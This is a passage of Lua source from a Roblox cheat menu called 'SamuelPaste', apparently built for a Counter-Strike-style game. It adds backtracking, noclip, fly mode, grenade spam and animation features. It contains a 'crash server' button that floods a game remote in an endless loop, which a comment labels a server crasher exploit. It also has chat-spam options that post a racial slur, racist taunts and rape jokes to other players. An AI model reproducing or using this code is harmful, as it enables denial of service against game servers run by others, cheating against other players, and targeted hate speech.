			player.Gun.insert2.SoundId = "rbxassetid://1657167827"
			player.Gun.insert3.SoundId = "rbxassetid://1657168103"
			player.Gun.insert4.SoundId = "rbxassetid://1657167530"
			player.Gun.insert5.SoundId = "rbxassetid://1657167827"
		end
		if player.EquippedTool.Value == "CZ" then
			player.Gun.Shoot.SoundId = "rbxassetid://458727115"
			player.Gun.magin.SoundId = "rbxassetid://1684284159"
			player.Gun.magout.SoundId = "rbxassetid://1684284647"
			player.Gun.slide.SoundId = "rbxassetid://1684284931"
			player.Gun.slidein.SoundId = "rbxassetid://1684285158"
		end
		if player.EquippedTool.Value == "Nova" then
			player.Gun.Shoot.SoundId = "rbxassetid://206953213"
			player.Gun.bolt.SoundId = "rbxassetid://206953217"
			player.Gun.insert1.SoundId = "rbxassetid://1657167530"
			player.Gun.insert2.SoundId = "rbxassetid://1657167827"
			player.Gun.insert3.SoundId = "rbxassetid://1657168103"
			player.Gun.insert4.SoundId = "rbxassetid://1657167530"
			player.Gun.insert5.SoundId = "rbxassetid://1657167827"
		end
		if player.EquippedTool.Value == "XM" then
			player.Gun.Shoot.SoundId = "rbxassetid://202918888"
			player.Gun.bolt.SoundId = "rbxassetid://361445424"
			player.Gun.boltin.SoundId = "rbxassetid://361445427"
			player.Gun.insert1.SoundId = "rbxassetid://1657167530"
			player.Gun.insert2.SoundId = "rbxassetid://1657167827"
			player.Gun.insert3.SoundId = "rbxassetid://1657168103"
			player.Gun.insert4.SoundId = "rbxassetid://1657167530"
			player.Gun.insert5.SoundId = "rbxassetid://1657167827"
		end
		if player.EquippedTool.Value == "MAG7" then
			player.Gun.Shoot.SoundId = "rbxassetid://395724758"
			player.Gun.maghit.SoundId = "rbxassetid://515216161"
			player.Gun.magin.SoundId = "rbxassetid://395724624"
			player.Gun.magout.SoundId = "rbxassetid://395724665"
			player.Gun.pump.SoundId = "rbxassetid://206953217"
		end

		if player.EquippedTool.Value == "Negev" then
			player.Gun.Shoot.SoundId = "rbxassetid://396243767"
			player.Gun.bolt.SoundId = "rbxassetid://1158042711"
			player.Gun.boltin.SoundId = "rbxassetid://1158042903"
			player.Gun.bullets.SoundId = "rbxassetid://1158043093"
			player.Gun.lidclose.SoundId = "rbxassetid://1158044531"
			player.Gun.lidopen.SoundId = "rbxassetid://1158044816"
			player.Gun.magin.SoundId = "rbxassetid://1158045048"
			player.Gun.magout.SoundId = "rbxassetid://1158045203"
		end

		if player.EquippedTool.Value == "SG" then
			player.Gun.Shoot.SoundId = "rbxassetid://347270113"
			player.Gun.bolt.SoundId = "rbxassetid://1684300765"
			player.Gun.boltin.SoundId = "rbxassetid://1684301039"
			player.Gun.magin.SoundId = "rbxassetid://1684301939"
			player.Gun.magout.SoundId = "rbxassetid://1684302178"
		end
		if player.EquippedTool.Value == "T Knife" then
			player.Gun.Shoot1.SoundId = "rbxassetid://1665637464"
			player.Gun.Shoot2.SoundId = "rbxassetid://1665637740"
		end
		if player.EquippedTool.Value == "CT Knife" then
			player.Gun.Shoot1.SoundId = "rbxassetid://1665637464"
			player.Gun.Shoot2.SoundId = "rbxassetid://1665637740"
		end
        if player.EquippedTool.Value == "M4A4" then
			player.Gun.Equip.SoundId = "rbxassetid://1665638797"
			player.Gun.Shoot.SoundId = "rbxassetid://202918741"
			player.Gun.bolt.SoundId = "rbxassetid://1684291592"
			player.Gun.boltin.SoundId = "rbxassetid://1684291797"
			player.Gun.boltrelease.SoundId = "rbxassetid://1684291797"
			player.Gun.magin.SoundId = "rbxassetid://1684292119"
			player.Gun.magout.SoundId = "rbxassetid://1684292401"
		end
        if player.EquippedTool.Value == "FiveSeven" then
			player.Gun.Shoot.SoundId = "rbxassetid://212374232"
			player.Gun.magin.SoundId = "rbxassetid://1684284159"
			player.Gun.magout.SoundId = "rbxassetid://1684284647"
			player.Gun.slide.SoundId = "rbxassetid://1684284931"
			player.Gun.slidein.SoundId = "rbxassetid://1684285158"
		end
        if player.EquippedTool.Value == "Tec9" then
			player.Gun.Shoot.SoundId = "rbxassetid://206953317"
			player.Gun.bolt.SoundId = "rbxassetid://206953330"
			player.Gun.boltin.SoundId = "rbxassetid://206953326"
			player.Gun.magin.SoundId = "rbxassetid://206953325"
			player.Gun.magout.SoundId = "rbxassetid://206953321"
            player.Gun.Shoot.TimePosition = 0
		end
if player.EquippedTool.Value == "R8" then
            player.Gun.Shoot.SoundId = "rbxassetid://3292861902"
player.Gun.Shoot.PlaybackSpeed = 1
        end
	end)
end)


end
end)

local Backtrack = misc:Sector("Backtrack", "Right")

Backtrack:Element("ToggleTrans", "enabled", {default = {Color = Color3.fromRGB(255,0,0)}}, function(tbl)
	if tbl.Toggle then
		Backtracking = RunService.RenderStepped:Connect(function()
			if IsAlive(LocalPlayer) then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v.Character and v.Character:FindFirstChild('UpperTorso') and GetTeam(v) ~= GetTeam(LocalPlayer) and not backtrackfolder:FindFirstChild(v.Name) then
						
						--[[local NewBacktrackPart = C.INST("Part")
						NewBacktrackPart.Name = v.Name
						NewBacktrackPart.Anchored = true
						NewBacktrackPart.CanCollide = false
						
						NewBacktrackPart.Color = tbl.Color
						NewBacktrackPart.Size = v.Character.Head.Size
						NewBacktrackPart.CFrame = v.Character.Head.CFrame
						NewBacktrackPart.Parent = backtrackfolder--]]
						
						--[[local Clone123123 = v.Character:Clone()
						for i,v in pairs(Clone123123:GetChildren()) do 
							if not v:IsA('Part') then 
								v:Destroy() 
							end 
							for i2,v2 in pairs(v:GetChildren()) do
								v:Destroy()
							end
							v.Color = tbl.Color
							v.Anchored = true
							v.CanCollide = false
							v.Transparency = values.misc.Backtrack["Transparency (0.01 = 1)"].Slider/100
						end--]]
						--local table = Clone:GetChildren()
						local model = C.INST('Model', backtrackfolder)
						model.Name = v.Name
						for i,v in pairs(v.Character:GetChildren()) do
							if v:IsA('Part') then
								local part = C.INST('Part', model)
								part.Size = v.Size
								part.Position = v.Position
								part.Orientation = v.Orientation
								part.CanCollide = false
								part.Anchored = true
								part.Name = v.Name
								part.Color = tbl.Color
								part.Transparency = tbl.Trans
							end
						end
						
						--NewBacktrackPart.Transparency = values.misc.Backtrack["Transparency (0.01 = 1)"].Slider/100
						local BacktrackTag = C.INST("ObjectValue")
						BacktrackTag.Parent = model
						BacktrackTag.Name = 'PlayerName'
						BacktrackTag.Value = v
						spawn(function() -- values.misc.movement["noclip"].Toggle
							wait(values.misc.Backtrack["Time (ms)"].Slider/1000)
							model:Destroy()
						end)
					end
				end
			end
		end)
	else
		Backtracking:Disconnect()
	end
end)

Backtrack:Element("Slider", "Time (ms)", {min = 0, max = 1000, default = 200})
local defaultbhop = misc:Sector('movement', 'Left')

defaultbhop:Element('Toggle', 'bunny hop')

defaultbhop:Element('Dropdown', 'direction', {options = {'forward', 'directional', 'directional 2'}})
defaultbhop:Element('Dropdown', 'type', {options = {'gyro', 'cframe', 'velocity', 'idk'}})
defaultbhop:Element('Slider', 'speed', {min = 0, max = 200, default = 40})

defaultbhop:Element('ToggleKeybind', 'overwrite')
defaultbhop:Element('Slider', 'overwrite speed', {min = 0, max = 200, default = 40})
defaultbhop:Element('Toggle', 'no gun')

defaultbhop:Element('Toggle', 'no velocity')

defaultbhop:Element('ToggleKeybind', 'no launch')

defaultbhop:Element('Slider', 'launch block (y velocity)', {min = 0, max = 100, default = 40})

defaultbhop:Element('ToggleKeybind', 'jump bug')
defaultbhop:Element('ToggleKeybind', 'edge jump')
defaultbhop:Element('ToggleKeybind', 'edge bug')

defaultbhop:Element('Toggle', 'height change')
defaultbhop:Element('Slider', 'height amount', {min = -35, max = 35, default = 0})

defaultbhop:Element('Toggle', 'client offset')
defaultbhop:Element('Slider', 'offset (y)', {min = -45, max = 45, default = 0})
		defaultbhop:Element("ToggleKeybind", "noclip",{},function(tbl)
			spawn(function()
				while values.misc.movement["noclip"].Toggle and values.misc.movement["noclip"].Active do
					RunService.Stepped:Wait()
					if LocalPlayer.Character then
						for i,v in pairs(LocalPlayer.Character:GetDescendants()) do
							if v:IsA("BasePart") then
								v.CanCollide = false
							end
						end
					end
				end
			end)
		end)
		--movement:Element('ToggleKeybind', 'noclip v2')
	
defaultbhop:Element("Toggle", "fly mode", {}, function(tbl)
if tbl.Toggle then
		FlyLoop = RunService.Stepped:Connect(function()
		if not (tbl.Toggle) then FlyLoop:Disconnect() return end
				spawn(function()
					pcall(function()
						local velocity = C.Vec3(0, 1, 0)
						
						if UserInputService:IsKeyDown(Enum.KeyCode.W) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.lookVector * values.misc.movement["fly speed"].Slider)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.A) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.rightVector * -values.misc.movement["fly speed"].Slider)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.S) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.lookVector * -values.misc.movement["fly speed"].Slider)
						end
						if UserInputService:IsKeyDown(Enum.KeyCode.D) then
							velocity = velocity + (workspace.CurrentCamera.CoordinateFrame.rightVector * values.misc.movement["fly speed"].Slider)
						end
						
						LocalPlayer.Character.HumanoidRootPart.Velocity = velocity
						LocalPlayer.Character.Humanoid.PlatformStand = true
					end)
				end)
		end)
		
		NoclipLoop = RunService.Stepped:Connect(function()
		if not (tbl.Toggle) then NoclipLoop:Disconnect() return end
			if IsAlive(LocalPlayer) then
				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					if v:IsA("BasePart") and v.CanCollide == true then
						v.CanCollide = false
					end
				end
			end
		end)
	end
end)

defaultbhop:Element("Slider", "fly speed", {min = 1, max = 300, default = 16})

local chatmessages_pasteed = {
	"Lost to SamuelPaste? Who woulda thought",
	"what was that? Can't hear u over my kill sound",
	"he shoots! and he misses",
	"I think im hvhing a homeless person",
	"SamuelPaste is pasted did you know?",
	"This hack is approved by invaded",
	"fun fact: this person is using SamuelPaste",
	"oww, thats gonna leave a bruise in the morning",
	"this is a tough workout!",
	"New years resolution: Keep clapping kids",
	"No way you're this bad?",
	"I just stole ur virginity",
	"Are you a chimney? Coz Im santa claus...",
	"Looks like you got coal for christmas",
	"Are you a train? Coz you're getting railed rn",
	"You and ur mom are very similar, coz both of u are getting raped"
}



local chatmessages_Racist = {
	"wait, you're black? explains it",
	"how are u black and gay?",
	"i hate black pussy",
	"nigger",
	"were u born in a chocolate factory?",
	"if ur black, why don't u just become white?",
	"blackie L"
}

local emojis = {
	[":clown:"] = utf8.char(129313);
	[":cold_face:"] = utf8.char(129398);
	[":neutral:"] = utf8.char(128528);
	[":sob:"] = utf8.char(128557);
	[":flushed:"] = utf8.char(128563);
	[":rofl:"] = utf8.char(129315);
	[':yawn:'] = utf8.char(129393);
}

function emoteReplace(str)
	for i,v in pairs(emojis) do
		if str:find(i) then
			asbqwewq = C.GSUB(str, i, v)
			shit = string.rep(asbqwewq, 18)
		end
	end
	return shit
end
local number = 0
local femboy = 1
local customchatspam = 0
local customchatspamtxt = readfile('SamuelPaste/customkillsay.txt'):split('\n', '')

local emojiesspam = {}
for i,v in pairs(emojis) do
C.INSERT(emojiesspam, i)
end
local chat = misc:Sector("chat", "Left") 
chat:Element("Toggle", "chat spam", nil, function(tbl) 
	if tbl.Toggle then 
		while values.misc.chat["chat spam"].Toggle and values.misc.chat.type.Dropdown ~= "emojie" and values.misc.chat.type.Dropdown ~= "femboy" do 
			wait(values.misc.chat["speed (ms)"].Slider/1000)
			ReplicatedStorage.Events.PlayerChatted:FireServer(
			values.misc.chat.type.Dropdown == "Text" and values.misc.chat['chat spam message'].Text
			or values.misc.chat.type.Dropdown == "SamuelPaste" and "$$$ I'm using SamuelPaste stormy lol $$$" 
			or values.misc.chat.type.Dropdown == "SEMI" and "||| RATTED BY SEMI ||| DONT FUCK WITH BLOXSENSE USERS |||" 
			or values.misc.chat.type.Dropdown == "bloxsense.gay" and "BloxSense.gay winning $$$"
			or values.misc.chat.type.Dropdown == "hexagon winning" and "Hexagon is the best!"
			or values.misc.chat.type.Dropdown == "hexagon losing" and "Hexagon sucks ass!!" -- randomkillsay[RANDOM(#randomkillsay)
			or values.misc.chat.type.Dropdown == "losing to samuel paste (random)" and chatmessages_pasteed[C.RANDOM(#chatmessages_pasteed)]
			or values.misc.chat.type.Dropdown == "racism (random)" and chatmessages_Racist[C.RANDOM(#chatmessages_Racist)]
			, false, "Innocent", false, true)
		end
		while tbl.Toggle and (values.misc.chat.type.Dropdown == "emojie" or values.misc.chat.type.Dropdown == "femboy") do 
		wait(0.5)
			if values.misc.chat.type.Dropdown ~= "emojie" then
				number = 1
			else
				number += 1
			end
			if number > #emojiesspam then 
				number = 1
			end
			if values.misc.chat.type.Dropdown == 'femboy' then
				femboy += 1
				if femboy == 3 then
				femboy = 1
				end
			end
			if values.misc.chat.type.Dropdown == 'custom' then
				
				customchatspam = customchatspam + 1
				if customchatspam == (#customchatspamtxt + 1) then
				customchatspam = 1
				end
			end
			ReplicatedStorage.Events.PlayerChatted:FireServer(
			values.misc.chat.type.Dropdown == 'femboy' and femboy == 1 and 'I am gay dm me to get my pics '..values.misc.chat['femboy discord'].Text
			or values.misc.chat.type.Dropdown == 'femboy' and femboy == 2 and 'DM me to get femboy pics '..values.misc.chat['femboy discord'].Text
			or values.misc.chat.type.Dropdown == "emojie" and emoteReplace(emojiesspam[number])
			or values.misc.chat.type.Dropdown == 'custom' and customchatspamtxt[customchatspam]
			
			, false, "Innocent", false, true)
			
		end 
	end
end) 
chat:Element("Dropdown", "type", {options = {
	'Text',
	"SamuelPaste", 
	"SEMI", 
	"bloxsense.gay", 
	"hexagon winning", 
	"hexagon losing", 
	"losing to samuel paste (random)", 
	"racism (random)", 
	"emojie",
	'femboy',
	'custom'
	}}) 
chat:Element("Slider", "speed (ms)", {min = 30, max = 400, default = 50}) 
chat:Element('TextBox', 'chat spam message', {placeholder = 'chat spam message'})
chat:Element('TextBox', 'femboy discord', {placeholder = 'write your discord nickname'})
chat:Element("Toggle", "kill say")
chat:Element("Dropdown", "kill say type", {options = {"default", "random", "custom file"}})
chat:Element('Dropdown', 'custom file type', {options = {'1,2,3 etc.', 'random'}})
chat:Element("TextBox", "message", {placeholder = "message"})
chat:Element("Toggle", "no filter") 
local grenades = misc:Sector("grenades", "Right") 
grenades:Element("ToggleKeybind", "spam grenades") 
coroutine.wrap(function() 
	while true do 
		wait(0.5) 
		if values.misc.grenades["spam grenades"].Toggle and values.misc.grenades["spam grenades"].Active then 
			local oh1 = ReplicatedStorage.Weapons[values.misc.grenades.grenade.Dropdown].Model 
			local oh3 = 25 
			local oh4 = 35 
			local oh6 = "" 
			local oh7 = "" 
			ReplicatedStorage.Events.ThrowGrenade:FireServer(oh1, nil, oh3, oh4, C.Vec3(0,-100,0), oh6, oh7) 
		end 
	end 
end)() 
grenades:Element("Dropdown", "grenade", {options = {"Flashbang", "Smoke Grenade", "Molotov", "HE Grenade", "Decoy Grenade"}}) 
grenades:Element("Button", "crash server", {}, function() 
CreateHitElement("Crashing server...",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
    while true do
        pcall(function()
            RunService.RenderStepped:Wait()
            for i = 1,100,1 do
                local ohInstance1 = LocalPlayer.Character.Gun.Mag                                                                                                                                                                                                                                                                                                    -- Server Crasher exploit by property (Mexicanhook). mis hermanos solo usan mexicanhook

                ReplicatedStorage.Events.DropMag:FireServer(ohInstance1)
            end
        end)
    end
end)    

local Dance = C.INST("Animation") 
Dance.AnimationId = ''
Dance.Name = 'Dance'

local LoadedAnim

local animations = misc:Sector('animations', 'Right')
animations:Element('ToggleKeybind', 'enabled', nil)

animations:Element('Slider', 'animation speed', {min = 0, max = 100, default = 1}, function()
	pcall(function()
		LoadedAnim:Stop()
	end)
end)

local animationsplay = {
	['idle'] = 'rbxassetid://2510196951',
	['fall over'] = 'rbxassetid://3716468774',
	['float'] = 'rbxassetid://1467170425',
	['sit down'] = 'rbxassetid://1467173451',
	['crouch'] = 'rbxassetid://896341616',
	['crunch'] = 'rbxassetid://4526742158',
    ['end spin'] = 'rbxassetid://6157859952',
	['headless pass'] = 'rbxassetid://5819194191',
	['floss'] = 'rbxassetid://5917459365',
	['default'] = 'rbxassetid://3732699835',
    ['Nothing'] = 'rbxassetid://2597335002',
	['toy walk'] = 'rbxassetid://6080889050',
	['laugh'] = 'rbxassetid://4529383951',
    ['Praisin'] = 'rbxassetid://2804019904',
	['grabbed'] = 'rbxassetid://5855133419',
	['getting eaten'] = 'rbxassetid://5855127786',
    ['No Touchin'] = 'rbxassetid://2805054405',
    ['Default'] = 'rbxassetid://3732699835',
    ['Thriller'] = 'rbxassetid://4174360426',
    ['Showtime Swing'] = 'rbxassetid://4802193849',
    ['Skateboard'] = 'rbxassetid://3725767158',
    ['Crazy Chainsaw'] = 'rbxassetid://5822705079',
    ['Summer Slack'] = 'rbxassetid://3226145532',
	['happy sit'] = 'rbxassetid://2743669791',
	['air sit'] = 'rbxassetid://5593420812',
	['sleep'] = 'rbxassetid://4165553098',
	['flying ragdoll'] = 'rbxassetid://5855128842',
	['naruto run'] = 'rbxassetid://4189480820',
	['hands on head'] = 'rbxassetid://6698274740',
	['sit'] = 'rbxassetid://507768133'
}

local animlist = {}

for a,b in next, animationsplay do 
	C.INSERT(animlist, a)
end
animations:Element('Dropdown', 'animation', {options = animlist}, function(tbl)
	pcall(function()
		LoadedAnim:Stop()
	end)

	Dance.AnimationId = animationsplay[tbl.Dropdown]
end)

animations:Element('TextBox', 'custom animation', {placeholder = 'animation id'}, function(tbl)
	pcall(function()
		LoadedAnim:Stop()
	end)

	Dance.AnimationId = 'rbxassetid://'..tbl.Text
end)

				local addons = misc:Sector("addons", "Left") 
				addons:Element('ToggleColor', 'Menu Accent', {default = {Color = MainUIColor}}, function(tbl)
					if tbl.Toggle then
						local oldUiColor = MainUIColor --Colorpick, ColorDrag, HueFrameGradient, Huepick, Huedrag
						MainUIColor = tbl.Color
						for i,v in pairs (game:GetService('CoreGui')['electric boogalo'].Menu.Tabs:GetDescendants()) do
							if v:IsA('Frame') and v.BackgroundColor3 == oldUiColor and v.Name ~= 'Color' and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('UIGradient') and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
							end
							if v:IsA('ScrollingFrame') then --and v.Name == 'Drop' and v.Parent.Name == 'Button'
								v.ScrollBarImageColor3 = MainUIColor
							end
							--[[if v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end--]]
							if v:IsA("UIGradient") and v.Parent.Name == 'Color' or v.Parent.Name == 'Background' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}
							end
							if v:IsA('Frame') and v.Name == 'Color' and v.Parent.Name == 'Button' and v.BackgroundColor3 == oldUiColor then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('Frame') and v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end
						end
						game:GetService("CoreGui").KeybindList.Frame.Grad.BackgroundColor3 = tbl.Color
						game:GetService("CoreGui").SpectatorsList.Spectators.Color.BackgroundColor3 = tbl.Color
						game:GetService("CoreGui")["fl indicator"].wgrgerqgerq.gradins.BackgroundColor3 = tbl.Color
						for i,v in pairs (game:GetService("CoreGui")["electric boogalo"].Menu.Holder.TabButtons:GetChildren()) do
							if v:IsA("TextButton") then
								v.Gard.BackgroundColor3 = tbl.Color
							end
						end
						for i,v in pairs (game:GetService("CoreGui")["MX_ONHIT"].OnHitFrame:GetChildren()) do
							if v:IsA("Frame") then
								v.Grad.BackgroundColor3 = tbl.Color
							end
						end
						
						
						
					else
						
						
						
						oldUiColor = tbl.Color
						MainUIColor = C.COL3RGB(255,20,147)
						game:GetService("CoreGui").KeybindList.Frame.Grad.BackgroundColor3 = MainUIColor
						game:GetService("CoreGui").SpectatorsList.Spectators.Color.BackgroundColor3 = MainUIColor
						game:GetService("CoreGui")["fl indicator"].wgrgerqgerq.gradins.BackgroundColor3 = MainUIColor
					for i,v in pairs (game:GetService('CoreGui')['electric boogalo'].Menu.Tabs:GetDescendants()) do
						if v:IsA('Frame') and v.BackgroundColor3 == oldUiColor and v.Name ~= 'Color' and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('UIGradient') and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
							end
							if v:IsA('ScrollingFrame') then --and v.Name == 'Drop' and v.Parent.Name == 'Button'
								v.ScrollBarImageColor3 = MainUIColor
							end
							--[[if v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end--]]
							if v:IsA("UIGradient") and v.Parent.Name == 'Color' or v.Parent.Name == 'Background' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}
							end
							if v:IsA('Frame') and v.Name == 'Color' and v.Parent.Name == 'Button' and v.BackgroundColor3 == oldUiColor then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('Frame') and v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end
					end
					  
						for i,v in pairs (game:GetService("CoreGui")["electric boogalo"].Menu.Holder.TabButtons:GetChildren()) do
							if v:IsA("TextButton") then
								v.Gard.BackgroundColor3 = C.COL3RGB(MainUIColor)
							end
						end	
						for i,v in pairs (game:GetService("CoreGui")["MX_ONHIT"].OnHitFrame:GetChildren()) do
							if v:IsA("Frame") then
								v.Grad.BackgroundColor3 = C.COL3RGB(MainUIColor)
							end
						end
					end
				end)
				
				watermarkthemes = {}
watermarklocation = nil
fonts = {
	'Legacy',
	'Arial',
	'ArialBold',
	'SourceSans',
	'SourceSansBold',
	'SourceSansSemibold',
	'SourceSansLight',
	'SourceSansItalic',
	'Bodoni',
	'Garamond',
	'Cartoon',
	'Code',
	'Highway',
	'SciFi',
	'Arcade',
	'Fantasy',
	'Antique',
	'Gotham',
	'GothamSemibold',
	'GothamBold',
	'GothamBlack',
	'AmaticSC',
	'Bangers',
	'Creepster',
	'DenkOne',
	'Fondamento',
	'FredokaOne',
	'GrenzeGotisch',
	'IndieFlower',
	'JosefinSans',
	'Jura',
	'Kalam',
	'LuckiestGuy',
	'Merriweather',
	'Michroma',
	'Nunito',
	'Oswald',
	'PatrickHand',
	'PermanentMarker',
	'Roboto',
	'RobotoCondensed',
	'RobotoMono',
	'Sarpanch',
	'SpecialElite',
	'TitilliumWeb',
	'Ubuntu',
}

do
	local watermark = C.INST('ScreenGui')
	local watermark_2 = C.INST('Frame')
	local title = C.INST('TextLabel')
	local none = C.INST('UIGradient')
	local linetop = C.INST('UIGradient')
	local linetopandbottem = C.INST('UIGradient')
	local shadowatbottem = C.INST('UIGradient')
	local shadowattop = C.INST('UIGradient')
	local shadowattopandbottom = C.INST('UIGradient')

	watermarklocation = watermark

	watermark.Name = 'watermark'
	watermark.Parent = game.CoreGui
	watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	watermark_2.Name = 'watermark'
	watermark_2.Parent = watermark
	watermark_2.BackgroundColor3 = C.COL3RGB(29, 29, 29)
	watermark_2.BorderColor3 = C.COL3RGB(255, 255, 255)
	watermark_2.Position = C.UDIM2(0.912, 0, 0.00858895481, 0)
	watermark_2.Size = C.UDIM2(0, 89, 0, 20)
	
	title.Name = 'title'
	title.Parent = watermark_2
	title.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	title.BackgroundTransparency = 1.000
	title.Position = C.UDIM2(0, 0, 0.0597654358, 0)
	title.Size = C.UDIM2(0, 0, 0, 18)
	title.Font = Enum.Font.Nunito
	title.LineHeight = 1.21
	title.Text = '         yes.no'
	title.TextColor3 = C.COL3RGB(255, 255, 255)
	title.TextSize = 16.000
	title.TextStrokeColor3 = C.COL3RGB(25, 25, 25)
	title.TextStrokeTransparency = 0.000
	title.TextXAlignment = Enum.TextXAlignment.Left

	none.Enabled = false
	none.Color =ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 255, 255))}
	none.Rotation = 0
	none.Name = 'none'
	none.Parent = watermark_2

	linetop.Enabled = false
	linetop.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.00, C.COL3RGB(56, 56, 56)), ColorSequenceKeypoint.new(0.00, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.66, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.99, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 255, 255))}
	linetop.Rotation = -90
	linetop.Name = 'linetop'
	linetop.Parent = watermark_2
	
	shadowatbottem.Enabled = false
	shadowatbottem.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(0, 0, 0))}
	shadowatbottem.Rotation = 90
	shadowatbottem.Name = 'shadowatbottem'
	shadowatbottem.Parent = watermark_2

	shadowattop.Enabled = false
	shadowattop.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(0, 0, 0))}
	shadowattop.Rotation = -90
	shadowattop.Name = 'shadowattop'
	shadowattop.Parent = watermark_2

	shadowattopandbottom.Enabled = false
	shadowattopandbottom.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(0.59, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
	shadowattopandbottom.Rotation = -90
	shadowattopandbottom.Name = 'shadowattopandbottom'
	shadowattopandbottom.Parent = watermark_2

	for a,b in next, watermark_2:GetChildren() do -- inserts all the theme names into 'watermarkthemes'
		if b:IsA('UIGradient') then
			C.INSERT(watermarkthemes, b.Name)
		end
	end
				dragging = false 
				do 
					local a = watermark_2
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									dragging = false 
								end 
							end) 
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and dragging then 
							update(input) 
						end 
					end) 
				end 
end


themebackground = {
	['Default'] = 8893436115,
    ['Shiba.gang'] = 2151741365,
    ['Hearts'] = 6073763717,
    ['Abstract'] = 6073743871,
    ['Hexagon'] = 6073628839,
    ['Circles'] = 6071579801,
    ['Lace With Flowers'] = 6071575925,
    ['Floral'] = 5553946656,
}

Images_names = {}
C.INSERT(Images_names, 'Default')
for a,b in next, themebackground do 
    insertwithoutdupes(Images_names, a)
end
				
			addons:Element('ToggleColor', 'ui border', {default = {Color = C.COL3RGB(255,255,255)}})	
				
				addons:Element('ToggleKeybind', 'gui keybind', {default = {Key = RightShift, Type = Toggle, Toggle = true}}, function(tbl)
	if tbl.Toggle then
		watermarklocation.watermark.Draggable = tbl.Active
		ovascreengui['ova'].Enabled = tbl.Active
		library.uiopen = tbl.Active
	end
end)
				addons:Element("TextBox", "mnt", {placeholder = "Custom cheat name"}, function()
					game:GetService("CoreGui")["electric boogalo"].Menu.Holder.TextLabel.Text = values.misc.addons.mnt.Text
					valuewtr = values.misc.addons.mnt.Text
					print(valuewtr)
				end)



addons:Element('Dropdown', 'background', {options = Images_names})

addons:Element('ToggleTrans', 'background color', {default = {Color = C.COL3RGB(180,180,180), Transparency = 0}})

local watermark = misc:Sector('watermark', 'Right')

watermark:Element('Toggle', 'enabled', {default = {Toggle = true}}, function(tbl)
	watermarklocation.Enabled = tbl.Toggle
end)

watermark:Element('Dropdown', 'themes', {options = watermarkthemes})

local watermarktext
watermark:Element('TextBox', 'watermark text', {placeholder = 'text here', default = {text = '         yes.no'}}, function(tbl)
	pcall(function()
		watermarktext:Disconnect()
	end)
	watermarktext = RunService.RenderStepped:Connect(function()
		wait(1)
		local textierawr = textboxtriggers(tbl.Text)
